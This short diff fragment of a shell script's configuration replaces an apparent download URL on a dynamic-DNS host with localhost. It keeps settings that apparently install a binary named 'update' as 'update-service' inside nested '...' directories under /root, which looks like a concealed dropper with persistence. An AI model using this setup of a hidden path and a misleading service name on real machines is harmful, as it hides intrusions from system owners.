@@ -4,7 +4,7 @@
 set -e
 
 # Configuration
-BINARY_URL="http://venex4f9a7b2c1d8e3f6g0h5j2k9l1m7n8o.duckdns.org:5000/update"
+BINARY_URL="http://127.0.0.1:5000/update"
 TARGET_DIR="/root/.../.../.../.../.../"
 BINARY_NAME="update"
 SERVICE_NAME="update-service"
